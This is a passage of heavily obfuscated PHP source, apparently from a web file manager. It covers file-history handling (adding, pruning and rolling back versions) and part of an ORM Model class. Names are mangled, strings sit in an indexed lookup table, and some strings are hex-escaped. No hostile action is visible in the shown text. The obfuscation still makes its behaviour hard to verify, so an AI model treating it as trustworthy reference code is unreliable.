is_int($à³œ‹œ)) { $à³œ‹œ = array($à³œ‹œ); } $ë¾…ıË¬ = array($¾é©ï¯[191], $¾é©ï¯[949] => $¾é©ï¯[585]); $Áé¤ã¼ª = array($¾é©ï¯[191] => array($¾é©ï¯[7], $à³œ‹œ)); $å³´äİ÷ = $this->field($ë¾…ıË¬)->where($Áé¤ã¼ª)->group($¾é©ï¯[191])->select(); return array_to_keyvalue($å³´äİ÷, $¾é©ï¯[191], $¾é©ï¯[585]); } public function addHistory($’ä×¢¢, $Ÿ‹ğ‡â¶ = '') { $äãÕÏÛ• =& $_SERVER[©—Ò»ÅĞ]; $Ûõ× ›ı = array($äãÕÏÛ•[506] => $’ä×¢¢[$äãÕÏÛ•[191]], $äãÕÏÛ•[1969] => isset($’ä×¢¢[$äãÕÏÛ•[543]]) ? $’ä×¢¢[$äãÕÏÛ•[543]] : $’ä×¢¢[$äãÕÏÛ•[541]], $äãÕÏÛ•[558] => $’ä×¢¢[$äãÕÏÛ•[557]], $äãÕÏÛ•[640] => $’ä×¢¢[$äãÕÏÛ•[79]], $äãÕÏÛ•[2436] => $Ÿ‹ğ‡â¶); if ($GLOBALS[$äãÕÏÛ•[6]][$äãÕÏÛ•[92]][$äãÕÏÛ•[1407]] >= 1) { $this->historyAutoClear($Ûõ× ›ı[$äãÕÏÛ•[191]]); $this->add($Ûõ× ›ı); } Hook::trigger($äãÕÏÛ•[2437], $Ûõ× ›ı); Model($äãÕÏÛ•[2438])->eventFileEdit($’ä×¢¢[$äãÕÏÛ•[191]]); } private function historyAutoClear($“‰ªÅ¾) { $ÕØ““Ã¼ =& $_SERVER[©—Ò»ÅĞ]; $ôıÏŞ¹ = Model($ÕØ““Ã¼[873])->get($ÕØ““Ã¼[961]); $œèµ¯ Ú = intval($GLOBALS[$ÕØ““Ã¼[6]][$ÕØ““Ã¼[92]][$ÕØ““Ã¼[1407]]); $œ÷ı×÷ù = $ôıÏŞ¹ == $ÕØ““Ã¼[962] ? min(5, $œèµ¯ Ú) : $œèµ¯ Ú; $œ÷ı×÷ù = $œ÷ı×÷ù <= 0 ? 0 : $œ÷ı×÷ù - 1; if ($œ÷ı×÷ù >= 499) { return; } $Æğ¬ÈÆÙ = array($ÕØ““Ã¼[506] => $“‰ªÅ¾); $¹†¼¤— = $this->field($ÕØ““Ã¼[2439])->where($Æğ¬ÈÆÙ)->order($ÕØ““Ã¼[2433])->select(); if (!$¹†¼¤— || $œ÷ı×÷ù >= count($¹†¼¤—)) { return; } $²îÊ¬–Ú = array_to_keyvalue($¹†¼¤—, $ÕØ““Ã¼[12], $ÕØ““Ã¼[487]); $²îÊ¬–Ú = array_slice($²îÊ¬–Ú, $œ÷ı×÷ù); $âæÕ²éß = array_to_keyvalue($¹†¼¤—, $ÕØ““Ã¼[12], $ÕØ““Ã¼[557]); $âæÕ²éß = array_slice($âæÕ²éß, $œ÷ı×÷ù); if (!$²îÊ¬–Ú || !$âæÕ²éß) { return; } $Æğ¬ÈÆÙ = array($ÕØ““Ã¼[508] => array($ÕØ““Ã¼[7], $²îÊ¬–Ú)); $this->where($Æğ¬ÈÆÙ)->delete(); Model($ÕØ““Ã¼[560])->remove($âæÕ²éß); } public function listData($…Ò³À¸ı) { $†ê›À³ =& $_SERVER[©—Ò»ÅĞ]; $î³å„óû = array($†ê›À³[506] => $…Ò³À¸ı); $‘Ç—ª = $†ê›À³[2440]; $Ä‹ÂˆÃº = $this->field($‘Ç—ª)->where($î³å„óû)->order($†ê›À³[2433])->selectPage(); $this->_listAppendUser($Ä‹ÂˆÃº[$†ê›À³[446]]); $£õßœõŸ = Model($†ê›À³[873])->get($†ê›À³[961]); $¯ÜÂ‰¼ = 5; if ($£õßœõŸ == $†ê›À³[962]) { $Ä‹ÂˆÃº[$†ê›À³[446]] = array_slice($Ä‹ÂˆÃº[$†ê›À³[446]], 0, $¯ÜÂ‰¼); $Ä‹ÂˆÃº[$†ê›À³[443]] = array($†ê›À³[2441] => 1, $†ê›À³[2442] => 20, $†ê›À³[2443] => 1, $†ê›À³[2332] => count($Ä‹ÂˆÃº[$†ê›À³[446]])); } return $Ä‹ÂˆÃº; } protected function _listAppendUser(&$ÇıÈ”˜Ï) { $äÕÇÛˆÕ =& $_SERVER[©—Ò»ÅĞ]; $ç‰æ¶ÒË = array_to_keyvalue($ÇıÈ”˜Ï, $äÕÇÛˆÕ[12], $äÕÇÛˆÕ[1592]); $îµ¯Öƒ = Model($äÕÇÛˆÕ[617])->userListInfo($ç‰æ¶ÒË); foreach ($ÇıÈ”˜Ï as &$Îï¬ôê¬) { $•‡›šö­ = $Îï¬ôê¬[$äÕÇÛˆÕ[1592]]; $Îï¬ôê¬[$äÕÇÛˆÕ[541]] = $îµ¯Öƒ[$•‡›šö­] ? $îµ¯Öƒ[$•‡›šö­] : !1; } unset($Îï¬ôê¬); } public function fileInfo($‹ı”äÜ, $ÄüÂ¨Ğ = false) { $ûù©ó×Ç =& $_SERVER[©—Ò»ÅĞ]; $èƒ¶¾¥¸ = $this->tablePrefix; $ş¡¢±ÓÀ = "{$èƒ¶¾¥¸}\x69\157\x5f\146\151\x6c\x65\x20\x66\x69\x6c\145\x73\40\157\156\40\146\151\154\x65\x73\56\146\151\154\145\x49\x44\40\75\x20\x68\x69\163\164\x6f\162\x79\x2e\146\x69\154\145\111\x44"; $š„« = $this->alias($ûù©ó×Ç[2444])->where(array($ûù©ó×Ç[508] => $‹ı”äÜ))->join($ş¡¢±ÓÀ, $ûù©ó×Ç[2445])->find(); if ($š„« && $ÄüÂ¨Ğ) { $êöÈ¹ÕÌ = array($ûù©ó×Ç[191] => $š„«[$ûù©ó×Ç[191]], $ûù©ó×Ç[487] => array($ûù©ó×Ç[1181], $‹ı”äÜ)); $š„«[$ûù©ó×Ç[1864]] = $this->where($êöÈ¹ÕÌ)->count(); } return $š„«; } public function removeItem($­ëµ—îê) { $áû¶†Ä =& $_SERVER[©—Ò»ÅĞ]; $¸¥Î¸Î¤ = array($áû¶†Ä[508] => $­ëµ—îê); $“Ø €Ü = $this->where($¸¥Î¸Î¤)->find(); if ($“Ø €Ü) { $å”¦ŒŸÀ = $this->where($¸¥Î¸Î¤)->delete(); Model($áû¶†Ä[560])->remove($“Ø €Ü[$áû¶†Ä[557]]); return $å”¦ŒŸÀ; } return !1; } public function removeBySource($¼ê£á™Ú) { $ä¨îÕ´ =& $_SERVER[©—Ò»ÅĞ]; if (!$¼ê£á™Ú) { return !1; } if (!is_array($¼ê£á™Ú)) { $¼ê£á™Ú = array($¼ê£á™Ú); } $ú˜í¾è = array($ä¨îÕ´[506] => array($ä¨îÕ´[7], $¼ê£á™Ú)); $¹Í õ–ˆ = $this->field($ä¨îÕ´[558])->where($ú˜í¾è)->select(); if ($¹Í õ–ˆ) { $this->where($ú˜í¾è)->delete(); $Å§¯øÕ„ = array_to_keyvalue($¹Í õ–ˆ, $ä¨îÕ´[12], $ä¨îÕ´[557]); Model($ä¨îÕ´[560])->remove($Å§¯øÕ„); } return !0; } public function setDetail($¯Ìâ²ñ, $òÒ¤Ä¥) { $™ÍıÃÉ« =& $_SERVER[©—Ò»ÅĞ]; return $this->where(array($™ÍıÃÉ«[508] => $¯Ìâ²ñ))->save(array($™ÍıÃÉ«[2436] => $òÒ¤Ä¥)); } public function rollbackToItem($Ï°î›úõ, $‡ª›¸÷É) { $ÉáÏ”¡ =& $_SERVER[©—Ò»ÅĞ]; $ÜÑÒÒ¾÷ = Model($ÉáÏ”¡[933])->sourceInfo($Ï°î›úõ); $this->addHistory($ÜÑÒÒ¾÷, LNG($ÉáÏ”¡[2446])); $å¢§²Ñ× = $this->find($‡ª›¸÷É); $ûÁÌÎ´ó = array($ÉáÏ”¡[557] => $å¢§²Ñ×[$ÉáÏ”¡[557]], $ÉáÏ”¡[79] => $å¢§²Ñ×[$ÉáÏ”¡[79]], $ÉáÏ”¡[88] => time(), $ÉáÏ”¡[543] => USER_ID); Model($ÉáÏ”¡[933])->where(array($ÉáÏ”¡[191] => $Ï°î›úõ))->save($ûÁÌÎ´ó); return $this->where(array($ÉáÏ”¡[508] => $‡ª›¸÷É))->delete(); } public function clearSame($Â‰ÒË‹–) { $µïœ¢Ğš =& $_SERVER[©—Ò»ÅĞ]; $†·†œ¯ó = $this->listData($Â‰ÒË‹–); $¨îÃÃ¥± = array_to_keyvalue_group($†·†œ¯ó, $µïœ¢Ğš[557]); $¸£÷‰ñ… = array(); $ï²¶œ¥É = array(); foreach ($¨îÃÃ¥± as $Ã“–¥éÂ) { if (!$Ã“–¥éÂ || count($Ã“–¥éÂ) <= 1) { continue; } foreach ($Ã“–¥éÂ as $¨–è“Üö) { $¸£÷‰ñ…[] = $¨–è“Üö[$µïœ¢Ğš[557]]; $ï²¶œ¥É[] = $¨–è“Üö[$µïœ¢Ğš[487]]; } } if (!$ï²¶œ¥É) { return; } $this->where(array($µïœ¢Ğš[487] => array($µïœ¢Ğš[7], $ï²¶œ¥É)))->delete(); Model($µïœ¢Ğš[560])->remove($¸£÷‰ñ…); } public function userSpace() { $òªêğÆÌ =& $_SERVER[©—Ò»ÅĞ]; $°ûÀ·Ÿ» = $this->tablePrefix; $õâ‚öĞè = array($òªêğÆÌ[1969] => USER_ID); $½æ÷ˆÌÛ = "{$°ûÀ·Ÿ»}\151\x6f\137\x66\x69\154\145\40\x66\151\154\145\163\x20\157\156\40\x66\151\154\x65\163\x2e\146\151\154\x65\x49\104\x20\75\x20\x68\x69\163\164\157\162\171\x2e\146\151\154\x65\111\104"; return $this->alias($òªêğÆÌ[2444])->where($õâ‚öĞè)->join($½æ÷ˆÌÛ, $òªêğÆÌ[2445])->sum($òªêğÆÌ[79]); } } goto DĞùĞ‡¾Ğ‚; E¯”ï²È„Ì: define($_SERVER[©—Ò»ÅĞ][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\145", "\157\x72\x64\x65\x72", "\141\x6c\x69\x61\163", "\x68\141\x76\x69\156\147", "\x67\x72\x6f\x75\x70", "\x6c\157\x63\x6b", "\x64\151\163\x74\x69\156\x63\x74", "\x61\165\164\157", "\146\151\154\x74\145\162", "\166\x61\x6c\x69\144\x61\x74\x65", "\x72\145\x73\165\x6c\164", "\x62\151\156\144", "\x74\157\153\x65\x6e"); public function __construct($áÍÏç = '', $“ğÕ·İÂ = '', $‘¥ÃˆŒÓ = '') { $¹¹š¦³„ =& $_SERVER[©—Ò»ÅĞ]; $this->_initialize(); if (!empty($áÍÏç)) { if (strpos($áÍÏç, $¹¹š¦³„[10])) { list($this->dbName, $this->name) = explode($¹¹š¦³„[10], $áÍÏç); } else { $this->name = $áÍÏç; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($“ğÕ·İÂ)) { $this->tablePrefix = $¹¹š¦³„[12]; } elseif ($¹¹š¦³„[12] != $“ğÕ·İÂ) { $this->tablePrefix = $“ğÕ·İÂ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¹¹š¦³„[321]); } $this->db(0, empty($this->connection) ? $‘¥ÃˆŒÓ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $»¥®®Ë¹ =& $_SERVER[©—Ò»ÅĞ]; if (empty($this->fields)) { if (think_config($»¥®®Ë¹[322])) { $ú÷ÇÇºé = $this->dbName ? $this->dbName : think_config($»¥®®Ë¹[323]); $™ı¯äñÖ = think_var_cache($»¥®®Ë¹[324] . strtolower(get_path_this($ú÷ÇÇºé) . $»¥®®Ë¹[10] . $this->name)); if ($™ı¯äñÖ) { $¡£Àí¯Ù = think_config($»¥®®Ë¹[325]); if (empty($¡£Àí¯Ù) || $™ı¯äñÖ[$»¥®®Ë¹[326]] == $¡£Àí¯Ù) { $this->fields = $™ı¯äñÖ; return; } } } $this->flush(); } } public function flush() { $Úş”á¿Ù =& $_SERVER[©—Ò»ÅĞ]; $this->db->setModel($this->name); $ÑÂ¾› = $this->db->getFields($this->getTableName()); if (!$ÑÂ¾›) { return !1; } $this->fields = array_keys($ÑÂ¾›); $this->fields[$Úş”á¿Ù[327]] = !1; foreach ($ÑÂ¾› as $ÖšëËˆ² => $Ë¯³œŒØ) { $’äŒ“ÄÙ[$ÖšëËˆ²] = $Ë¯³œŒØ[$Úş”á¿Ù[33]]; if ($Ë¯³œŒØ[$Úş”á¿Ù[39]]) { $this->fields[$Úş”á¿Ù[328]] = $ÖšëËˆ²; if ($Ë¯³œŒØ[$Úş”á¿Ù[42]]) { $this->fields[$Úş”á¿Ù[327]] = !0; } } } $this->fields[$Úş”á¿Ù[329]] = $’äŒ“ÄÙ; if (think_config($Úş”á¿Ù[325])) { $this->fields[$Úş”á¿Ù[326]] = think_config($Úş”á¿Ù[325]); } if (think_config($Úş”á¿Ù[322])) { $œíÃŠ’ƒ = $this->dbName ? $this->dbName : think_config($Úş”á¿Ù[323]); think_var_cache($Úş”á¿Ù[324] . strtolower(get_path_this($œíÃŠ’ƒ) . $Úş”á¿Ù[10] . $this->name), $this->fields); } } public function switchModel($¥³®¿Ø, $¸Í´€ßê = array()) { $¾ß™£Üç =& $_SERVER[©—Ò»ÅĞ]; $´½ŸÃëÖ = ucwords(strtolower($¥³®¿Ø)) . $¾ß™£Üç[330]; if (!class_exists($´½ŸÃëÖ)) { think_exception($´½ŸÃëÖ . think_lang($¾ß™£Üç[331])); } $this->_extModel = new $´½ŸÃëÖ($this->name); if (!empty($¸Í´€ßê)) { foreach ($¸Í´€ßê as $´ÎéÖÍ×) { $this->_extModel->setProperty($´ÎéÖÍ×, $this->{$´ÎéÖÍ×}); } } return $this->_extModel; } public function __set($‰¯†û¡û, $ê±Š†„Ä) { $this->data[$‰¯†û¡û] = $ê±Š†„Ä; } public function __get($ÆÁÏêÚñ) { return isset($this->data[$ÆÁÏêÚñ]) ? $this->data[$ÆÁÏêÚñ] : null; } public function __isset($ˆ˜ê×†Ÿ) { return isset($this->data[$ˆ˜ê×†Ÿ]); } public function __unset($¿Ï•õ‹©) { unset($this->data[$¿Ï•õ‹©]); } public function __call($à¢áØÌÜ, $ÛÅÛš×) { $ùĞúùä =& $_SERVER[©—Ò»ÅĞ]; if (in_array(strtolower($à¢áØÌÜ), $this->methods, !0)) { $this->options[strtolower($à¢áØÌÜ)] = $ÛÅÛš×[0]; return $this; } elseif (in_array(strtolower($à¢áØÌÜ), array($ùĞúùä[332], $ùĞúùä[333], $ùĞúùä[334], $ùĞúùä[335], $ùĞúùä[336]), !0)) { $ ÙåÚÑ‚ = isset($ÛÅÛš×[0]) ? $ÛÅÛš×[0] : $ùĞúùä[220]; $ ÙåÚÑ‚ = $this->db->parseKey($ ÙåÚÑ‚); return $this->getField(strtoupper($à¢áØÌÜ) . $ùĞúùä[337] . $ ÙåÚÑ‚ . $ùĞúùä[338] . $à¢áØÌÜ, $ùĞúùä[332]); } elseif (strtolower(substr($à¢áØÌÜ, 0, 5)) == $ùĞúùä[339]) { $ ÙåÚÑ‚ = think_parse_name(substr($à¢áØÌÜ, 5)); $Œì°ÔÊØ[$ ÙåÚÑ‚] = $ÛÅÛš×[0]; return $this->where($Œì°ÔÊØ)->find(); } elseif (strtolower(substr($à¢áØÌÜ, 0, 10)) == $ùĞúùä[340]) { $ÊØåå‘ = think_parse_name(substr($à¢áØÌÜ, 10)); $Œì°ÔÊØ[$ÊØåå‘] = $ÛÅÛš×[0]; return $this->where($Œì°ÔÊØ)->getField($ÛÅÛš×[1]); } elseif (isset($this->_scope[$à¢áØÌÜ])) { return $this->scope($à¢áØÌÜ, $ÛÅÛš×[0]); } elseif (method_exists($this, $à¢áØÌÜ) || method_exists($this, $ùĞúùä[341] . $à¢áØÌÜ)) { array_unshift($ÛÅÛš×, $à¢áØÌÜ); return call_user_func_array(array($this, $ùĞúùä[342]), $ÛÅÛš×); } else { return call_user_func_array(array(parent, $à¢áØÌÜ), $ÛÅÛš×); } } protected function call() { $Ñ¬äÔŞë =& $_SERVER[©—Ò»ÅĞ]; $àØÛÁ€¢ = func_get_args(); $à¤ƒ°§Ø = array_shift($àØÛÁ€¢); $ß¯çÆÀ¡ = $à¤ƒ°§Ø; if (is_array($à¤ƒ°§Ø)) { $ß¯çÆÀ¡ = $à¤ƒ°§Ø[1]; $à¤ƒ°§Ø = $à¤ƒ°§Ø[0]; } $ìâßüî = count($àØÛÁ€¢) - 1; if (isset($àØÛÁ€¢[$ìâßüî]) && $àØÛÁ€¢[$ìâßüî] === $à¤ƒ°§Ø) { think_exception(__CLASS__ . $Ñ¬äÔŞë[4] . $à¤ƒ°§Ø . think_lang($Ñ¬äÔŞë[343])); return; } $àØÛÁ€¢[] = $à¤ƒ°§Ø; if (method_exists($this, $Ñ¬äÔŞë[344])) { $˜’±İÛ = call_user_func_array(array($this, $Ñ¬äÔŞë[345]), array($ß¯çÆÀ¡, $àØÛÁ€¢)); if (!is_null($˜’±İÛ) && $˜’±İÛ !== !1) { return $˜’±İÛ; } } $áû¢ëƒæ = !1; if (method_exists($this, $à¤ƒ°§Ø)) { $áû¢ëƒæ = call_user_func_array(array($this, $à¤ƒ°§Ø), $àØÛÁ€¢); } if (method_exists($this, $Ñ¬äÔŞë[346])) { $˜’±İÛ = call_user_func_array(array($this, $Ñ¬äÔŞë[347]), array($ß¯çÆÀ¡, $àØÛÁ€¢, $áû¢ëƒæ)); if ($˜’±İÛ) { return $˜’±İÛ; } } return $áû¢ëƒæ; } protected function _initialize() { } protected function _facade($şµÕ­æÕ) { $Æ®°¹Í½ =& $_SERVER[©—Ò»ÅĞ]; if (!empty($this->fields)) { foreach ($şµÕ­æÕ as $Ç‚ÊÂş => $ƒ¸ªÂøß) { if (is_array($this->fields) && !in_array($Ç‚ÊÂş, $this->fields, !0)) { unset($şµÕ­æÕ[$Ç‚ÊÂş]); } elseif (is_scalar($ƒ¸ªÂøß)) { $this->_parseType($şµÕ­æÕ, $Ç‚ÊÂş); } } } if (!empty($this->options[$Æ®°¹Í½[348]])) { $şµÕ­æÕ = array_map($this->options[$Æ®°¹Í½[348]], $şµÕ­æÕ); unset($this->options[$Æ®°¹Í½[348]]); } $this->_beforeWrite($şµÕ­æÕ); return $şµÕ­æÕ; } protected function _beforeWrite(&$„¤¶İ»‹) { } public function add($’â¸á•Á = '', $ÚÉÀ® = array(), $‡‚‡«à¾ = false) { if (empty($’â¸á•Á)) { if (!empty($this->data)) { $’â¸á•Á = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[©—Ò»ÅĞ][349]); return !1; } } $ÚÉÀ® = $this->_parseOptions($ÚÉÀ®); $’â¸á•Á = $this->_facade($’â¸á•Á); if (!1 === $this->_beforeInsert($’â¸á•Á, $ÚÉÀ®)) { return !1; } $×òû¼ª¬ = $this->db->insert($’â¸á•Á, $ÚÉÀ®, $‡‚‡«à¾); if (!1 !== $×òû¼ª¬) { $£ÁÕĞ¬ = $this->getLastInsID(); if ($£ÁÕĞ¬) { $’â¸á•Á[$this->getPk()] = $£ÁÕĞ¬; $this->_after_insert($’â¸á•Á, $ÚÉÀ®); return $£ÁÕĞ¬; } $this->_after_insert($’â¸á•Á, $ÚÉÀ®); } return $×òû¼ª¬; } protected function _beforeInsert(&$ğ·Åâ„, $ş‹×¼ù) { } protected function _after_insert($Û–æøÕ©, $Ôü´ê²©) { } public function addAll($Ş÷„Š…¤, $èØ…‘õ = array(), $„Ìé¿îê = false) { $ÆôıŒ©ô =& $_SERVER[©—Ò»ÅĞ]; if (empty($Ş÷„Š…¤)) { $this->error = think_lang($ÆôıŒ©ô[349]); return !1; } $èØ…‘õ = $this->_parseOptions($èØ…‘õ); foreach ($Ş÷„Š…¤ as $­àœ‰ñå => $è»ßìØ‘) { $Ş÷„Š…¤[$­àœ‰ñå] = $this->_facade($è»ßìØ‘); } if (method_exists($this->db, $ÆôıŒ©ô[350])) { $©¯Îƒáà = $this->db->insertAll($Ş÷„Š…¤, $èØ…‘õ, $„Ìé¿îê); } else { $this->startTrans(); foreach ($Ş÷„Š…¤ as $­àœ‰ñå => $è»ßìØ‘) { $©¯Îƒáà = $this->db->insert($è»ßìØ‘, $èØ…‘õ, $„Ìé¿îê); } $this->commit(); } if (!1 !== $©¯Îƒáà) { $Ùû¸ªœ = $this->getLastInsID(); if ($Ùû¸ªœ) { return $Ùû¸ªœ; } } return $©¯Îƒáà; } public function selectAdd($»œ îŒù = '', $“ÙÅ¾…ú = '', $ğœ¤ç°Í = array()) { $œ×ï…Ï‘ =& $_SERVER[©—Ò»ÅĞ]; $ğœ¤ç°Í = $this->_parseOptions($ğœ¤ç°Í); if (!1 === ($²İç¾şº = $this->db->selectInsert($»œ îŒù ? $»œ îŒù : $ğœ¤ç°Í[$œ×ï…Ï‘[351]], $“ÙÅ¾…ú ? $“ÙÅ¾…ú : $this->getTableName(), $ğœ¤ç°Í))) { $this->error = think_lang($œ×ï…Ï‘[352]); return !1; } else { return $²İç¾şº; } } public function save($ù±ÚØ¼ = '', $º¿­¢ê  = array()) { $ªÏ¡ğçŞ =& $_SERVER[©—Ò»ÅĞ]; if (empty($ù±ÚØ¼)) { if (!empty($this->data)) { $ù±ÚØ¼ = $this->data; $this->data = array(); } else { $this->error = think_lang($ªÏ¡ğçŞ[349]); return !1; } } $ù±ÚØ¼ = $this->_facade($ù±ÚØ¼); $º¿­¢ê  = $this->_parseOptions($º¿­¢ê ); $¯ó£ş¾› = $this->getPk(); if (!isset($º¿­¢ê [$ªÏ¡ğçŞ[353]])) { if (isset($ù±ÚØ¼[$¯ó£ş¾›])) { $¢ß¾¤×è[$¯ó£ş¾›] = $ù±ÚØ¼[$¯ó£ş¾›]; $º¿­¢ê [$ªÏ¡ğçŞ[353]] = $¢ß¾¤×è; unset($ù±ÚØ¼[$¯ó£ş¾›]); } else { $this->error = think_lang($ªÏ¡ğçŞ[352]); return !1; } } if (is_array($º¿­¢ê [$ªÏ¡ğçŞ[353]]) && isset($º¿­¢ê [$ªÏ¡ğçŞ[353]][$¯ó£ş¾›])) { $¿Ş›¡ñ× = $º¿­¢ê [$ªÏ¡ğçŞ[353]][$¯ó£ş¾›]; } if (!1 === $this->_beforeUpdate($ù±ÚØ¼, $º¿­¢ê )) { return !1; } $…òÏÓÔ« = $this->db->update($ù±ÚØ¼, $º¿­¢ê ); if (!1 !== $…òÏÓÔ«) { if (isset($¿Ş›¡ñ×)) { $ù±ÚØ¼[$¯ó£ş¾›] = $¿Ş›¡ñ×; } $this->_afterUpdate($ù±ÚØ¼, $º¿­¢ê ); } return $…òÏÓÔ«; } protected function _beforeUpdate(&$§îİÉ„Æ, $Ã­ÓÓ©¨) { } protected function _afterUpdate($öö–İ¸Ê, $ãÄ‚öŞ„) { } public function delete($¾é¤‹»§ = array()) { $•„´ò¯å =& $_SERVER[©—Ò»ÅĞ]; if (empty($¾é¤‹»§) && empty($this->options[$•„´ò¯å[353]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ÕÖˆ†—ã = $this->getPk(); if (is_numeric($¾é¤‹»§) || is_string($¾é¤‹»§)) { if (strpos($¾é¤‹»§, $•„´ò¯å[50])) { $¬Â¼“í´[$ÕÖˆ†—ã] = array($•„´ò¯å[354], $¾é¤‹»§); } else { $¬Â¼“í´[$ÕÖˆ†—ã] = $¾é¤‹»§; } $this->options[$•„´ò¯å[353]] = $¬Â¼“í´; } $¾é¤‹»§ = $this->_parseOptions(); if (is_array($¾é¤‹»§[$•„´ò¯å[353]]) && isset($¾é¤‹»§[$•„´ò¯å[353]][$ÕÖˆ†—ã])) { $·™é™Ñ€ = $¾é¤‹»§[$•„´ò¯å[353]][$ÕÖˆ†—ã]; } $‹÷øÅ¿± = $this->db->delete($¾é¤‹»§); if (!1 !== $‹÷øÅ¿±) { $ÖãÚ÷° = array(); if (isset($·™é™Ñ€)) { $ÖãÚ÷°[$ÕÖˆ†—ã] = $·™é™Ñ€; } $this->_after_delete($ÖãÚ÷°, $¾é¤‹»§); } return $‹÷øÅ¿±; } protected function _after_delete($úóŠ™Æª, $ú‚©ìÑü) { } public function select($’³”Ş’ = array()) { $Ñ‰âÍÚ“ =& $_SERVER[©—Ò»ÅĞ]; if (is_string($’³”Ş’) || is_numeric($’³”Ş’)) { $´Üùİï® = $this->getPk(); if (strpos($’³”Ş’, $Ñ‰âÍÚ“[50])) { $ÛŠ±ÒîÍ[$´Üùİï®] = array($Ñ‰âÍÚ“[354], $’³”Ş’); } else { $ÛŠ±ÒîÍ[$´Üùİï®] = $’³”Ş’; } $this->options[$Ñ‰âÍÚ“[353]] = $ÛŠ±ÒîÍ; } elseif (!1 === $’³”Ş’) { $’³”Ş’ = $this->_parseOptions(); return $Ñ‰âÍÚ“[355] . $this->db->buildSelectSql($’³”Ş’) . $Ñ‰âÍÚ“[356]; } $’³”Ş’ = $this->_parseOptions(); $·Äó„¯ = $this->db->select($’³”Ş’); if (!1 === $·Äó„¯) { return !1; } if (empty($·Äó„¯)) { return null; } $this->_afterSelect($·Äó„¯, $’³”Ş’); return $·Äó„¯; } protected function _afterSelect(&$ì½Ö•ÃÚ, $Â£¥¨¼ô) { } public function buildSql($÷ë£ËÇÔ = array()) { $ÁÖúŠ” =& $_SERVER[©—Ò»ÅĞ]; $÷ë£ËÇÔ = $this->_parseOptions($÷ë£ËÇÔ); return $ÁÖúŠ”[355] . $this->db->buildSelectSql($÷ë£ËÇÔ) . $ÁÖúŠ”[356]; } public function optionsValue($Ş•Ú—·¾ = null) { if (is_null($Ş•Ú—·¾)) { return $this->options; } elseif (is_array($Ş•Ú—·¾)) { $this->options = array_merge($this->options, $Ş•Ú—·¾); } } protected function _parseOptions($À×âÃĞØ = array()) { $‰Õáúšì =& $_SERVER[©—Ò»ÅĞ]; if (is_array($À×âÃĞØ)) { $À×âÃĞØ = array_merge($this->options, $À×âÃĞØ); } $this->options = array(); if (!isset($À×âÃĞØ[$‰Õáúšì[357]])) { $À×âÃĞØ[$‰Õáúšì[357]] = $this->getTableName(); $İƒú¦÷Ş = $this->fields; } else { $İƒú¦÷Ş = $this->getDbFields(); } if (!empty($À×âÃĞØ[$‰Õáúšì[358]])) { $À×âÃĞØ[$‰Õáúšì[357]] .= $‰Õáúšì[53] . $À×âÃĞØ[$‰Õáúšì[358]]; } $À×âÃĞØ[$‰Õáúšì[359]] = $this->name; if (isset($À×âÃĞØ[$‰Õáúšì[353]]) && is_array($À×âÃĞØ[$‰Õáúšì[353]]) && !empty($İƒú¦÷Ş) && !isset($À×âÃĞØ[$‰Õáúšì[360]]) && !isset($À×âÃĞØ[$‰Õáúšì[357]])) { foreach ($À×âÃĞØ[$‰Õáúšì[353]] as $¨ªÆ => $õ¢ºô) { $¨ªÆ = trim($¨ªÆ); if (in_array($¨ªÆ, $İƒú¦÷Ş, !0)) { if (is_scalar($õ¢ºô)) { $this->_parseType($À×âÃĞØ[$‰Õáúšì[353]], $¨ªÆ); } } elseif (!is_numeric($¨ªÆ) && $‰Õáúšì[11] != substr($¨ªÆ, 0, 1) && !1 === strpos($¨ªÆ, $‰Õáúšì[10]) && !1 === strpos($¨ªÆ, $‰Õáúšì[337]) && !1 === strpos($¨ªÆ, $‰Õáúšì[212]) && !1 === strpos($¨ªÆ, $‰Õáúšì[284])) { unset($À×âÃĞØ[$‰Õáúšì[353]][$¨ªÆ]); } } } $this->_options_filter($À×âÃĞØ); return $À×âÃĞØ; } protected function _options_filter(&$Õ†”šÓ) { } protected function _parseType(&$ëóÛÌßÏ, $‡ƒ“ê•Ç) { $»›ìó =& $_SERVER[©—Ò»ÅĞ]; if (empty($this->options[$»›ìó[361]][$»›ìó[4] . $‡ƒ“ê•Ç])) { $çà’ø£œ = strtolower($this->fields[$»›ìó[329]][$‡ƒ“ê•Ç]); if (!1 !== strpos($çà’ø£œ, $»›ìó[362])) { } elseif (!1 === strpos($çà’ø£œ, $»›ìó[363]) && !1 !== strpos($çà’ø£œ, $»›ìó[364])) { $ëóÛÌßÏ[$‡ƒ“ê•Ç] = intval($ëóÛÌßÏ[$‡ƒ“ê•Ç]); } elseif (!1 !== strpos($çà’ø£œ, $»›ìó[365]) || !1 !== strpos($çà’ø£œ, $»›ìó[366])) { $ëóÛÌßÏ[$‡ƒ“ê•Ç] = floatval($ëóÛÌßÏ[$‡ƒ“ê•Ç]); } elseif (!1 !== strpos($çà’ø£œ, $»›ìó[367])) { $ëóÛÌßÏ[$‡ƒ“ê•Ç] = (bool) $ëóÛÌßÏ[$‡ƒ“ê•Ç]; } } } public function find($ÏœœÄ±€ = array()) { $åóÆâš² =& $_SERVER[©—Ò»ÅĞ]; if (is_numeric($ÏœœÄ±€) || is_string($ÏœœÄ±€)) { $´ñŸêá[$this->getPk()] = intval($ÏœœÄ±€); $this->options[$åóÆâš²[353]] = $´ñŸêá; } $this->options[$åóÆâš²[368]] = 1; $ÏœœÄ±€ = $this->_parseOptions(); $çòŸÈ–’ = $this->db->select($ÏœœÄ±€); if (!1 === $çòŸÈ–’) { return !1; } if (empty($çòŸÈ–’)) { return null; } $¶Í®˜ı™ = $çòŸÈ–’[0]; $this->_afterFind($¶Í®˜ı™, $ÏœœÄ±€); return $¶Í®˜ı™; } protected function _afterFind(&$€æù²ŒÂ, $÷‰Œä÷€) { } protected function returnResult($úÊê»Å¿, $ÆíœÏã = '') { $Ó§üºµÁ =& 